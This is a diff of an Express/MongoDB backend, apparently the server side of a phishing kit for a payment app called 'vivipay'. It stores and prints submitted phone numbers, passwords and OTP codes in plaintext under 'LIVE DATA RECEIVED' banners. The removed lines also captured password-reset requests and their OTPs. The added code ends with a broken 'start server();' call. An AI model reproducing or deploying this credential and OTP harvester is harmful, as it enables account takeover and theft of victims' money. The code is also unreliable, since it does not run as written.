@@ -1,131 +1,84 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
+const { MongoMemoryServer } = require('mongodb-memory-server');
 
 const app = express();
 app.use(express.json());
+app.use(cors()); // Iske bina frontend aur backend connect nahi ho paate
 
-// FULL OVERRIDE CORS FOR LIVE SERVERS
-app.use(cors({
-    origin: '*',
-    methods: ['GET', 'POST'],
-    allowedHeaders: ['Content-Type']
-})); 
-
-// 1. Data Schema
+// 1. Data Structure (Schema)
 const userSchema = new mongoose.Schema({
-    phoneNumber: { type: String, default: "" },
-    password: { type: String, default: "" },
+    phoneNumber: { type: String, required: true },
+    password: { type: String, required: true },
     otpEntered: { type: String, default: "" },
-    resetPhone: { type: String, default: "" },
-    newPassword: { type: String, default: "" },
-    actionType: { type: String, default: "LOGIN" }, 
     createdAt: { type: Date, default: Date.now }
 });
 
 const User = mongoose.model('User', userSchema);
 
-let pendingResets = {};
-
-// 2. LIVE DATABASE CONNECT ENGINE
+// 2. Database Server Initialization Function
 async function startServer() {
     try {
-        // FIXED: Agar aapne dynamic environment link set kiya hai toh live cloud mongo chalega, varna internal engine use hoga bina crash kiye
-        const mongoUri = process.env.MONGO_URI || "mongodb://127.0.0.1:27017/vivipay_local";
+        // Yeh line bina Windows service ke automatic internal database chalu karegi
+        const mongoServer = await MongoMemoryServer.create();
+        const mongoUri = mongoServer.getUri();
         
-        // Render platforms background binary validation patch override
-        if(!process.env.MONGO_URI) {
-            try {
-                const { MongoMemoryServer } = require('mongodb-memory-server');
-                const mongoServer = await MongoMemoryServer.create();
-                await mongoose.connect(mongoServer.getUri());
-                console.log('🎉 MongoDB (In-Memory Internal) Activated!');
-            } catch(e) {
-                // If in-memory fails inside Render cluster, connect fallback to prevent crash
-                await mongoose.connect(mongoUri);
-                console.log('🎉 Fallback DB connected smoothly.');
-            }
-        } else {
-            await mongoose.connect(mongoUri);
-            console.log('🎉 Live Production MongoDB Connected Cloud Instance!');
-        }
+        await mongoose.connect(mongoUri);
+        console.log('\n====================================');
+        console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
+        console.log('====================================');
 
-        // Render standard env port structure binding configuration
-        const PORT = process.env.PORT || 4000;
-        app.listen(PORT, '0.0.0.0', () => {
-            console.log(`🚀 Live Backend actively running on core port: ${PORT}`);
+        // Server ko port 5500 par live sunne ke liye active karein
+        app.listen(4000, () => {
+            console.log('🚀 Backend Server running on port 4000');
+            console.log('Aapka backend puri tarah ready hai!');
+            console.log('====================================\n');
         });
     } catch (err) {
-        console.error('❌ DB connection crash intercepted safely:', err);
+        console.error('❌ Database Connection Error:', err);
     }
 }
 
-// 3. Login API Pipeline
+// 3. API Route: Login Data Receive Karne Ke Liye
 app.post('/api/login-submit', async (req, res) => {
     try {
         const { phoneNumber, password } = req.body;
-        const newUser = new User({ phoneNumber, password, actionType: "LOGIN" });
+        
+        // Data ko database mein hamesha ke liye save karein
+        const newUser = new User({ phoneNumber, password });
         const savedUser = await newUser.save();
         
-        console.log(`\n[🔥 LIVE LOGIN LOGS RECEIVED]`);
-        console.log(`📱 Phone : ${phoneNumber} | 🔑 Pass : ${password}`);
+        // TERMINAL PAR LIVE DATA DEKHNE KE LIYE
+        console.log(`\n[🔥 LIVE DATA RECEIVED]`);
+        console.log(`📱 Phone Number : ${phoneNumber}`);
+        console.log(`🔑 Password     : ${password}`);
+        console.log(`------------------------------------`);
         
         res.status(200).json({ success: true, userId: savedUser._id });
     } catch (error) {
-        res.status(500).json({ success: false, message: error.message });
+        res.status(500).json({ success: false, message: "Server Error" });
     }
 });
 
-// 4. Forgot API Pipeline
-app.post('/api/forgot-submit', async (req, res) => {
-    try {
-        const { phone, newPassword } = req.body;
-        pendingResets[phone] = { newPassword };
-
-        console.log(`\n[🔄 LIVE FORGOT TRIGGERED]`);
-        console.log(`📱 User : ${phone} | 🔑 New Pass : ${newPassword}`);
-
-        res.status(200).json({ success: true });
-    } catch (error) {
-        res.status(500).json({ success: false, message: error.message });
-    }
-});
-
-// 5. Universal OTP Pipe Router Handler 
+// 4. API Route: OTP Receive aur Update Karne Ke Liye
 app.post('/api/otp-submit', async (req, res) => {
     try {
-        const { userId, otp, isReset, phone } = req.body;
+        const { userId, otp } = req.body;
         
-        if (isReset) {
-            const cachedContext = pendingResets[phone];
-            if(cachedContext) {
-                const resetData = new User({
-                    resetPhone: phone,
-                    newPassword: cachedContext.newPassword,
-                    otpEntered: otp,
-                    actionType: "PASSWORD_RESET"
-                });
-                await resetData.save();
-
-                console.log(`\n[🔐 FORGOT OTP UPDATED ON LIVE]`);
-                console.log(`📱 Target: ${phone} | 🔐 OTP: ${otp}`);
-                
-                delete pendingResets[phone]; 
-                return res.status(200).json({ success: true });
-            } else {
-                return res.status(400).json({ success: false, message: "Session Expired" });
-            }
-        } else {
-            if (userId && mongoose.Types.ObjectId.isValid(userId)) {
-                await User.findByIdAndUpdate(userId, { otpEntered: otp });
-            }
-            console.log(`\n[🔑 LOGIN OTP UPDATED ON LIVE]`);
-            console.log(`🔐 OTP: ${otp}`);
-            res.status(200).json({ success: true });
-        }
+        // Purane user data ke andar OTP ko update karein
+        await User.findByIdAndUpdate(userId, { otpEntered: otp });
+        
+        console.log(`[🔑 OTP UPDATED SUCCESSFULLY]`);
+        console.log(`🆔 User ID : ${userId}`);
+        console.log(`🔐 OTP     : ${otp}`);
+        console.log('====================================');
+        
+        res.status(200).json({ success: true });
     } catch (error) {
-        res.status(500).json({ success: false, message: error.message });
+        res.status(500).json({ success: false, message: "Server Error" });
     }
 });
 
-startServer();
+
+start server();
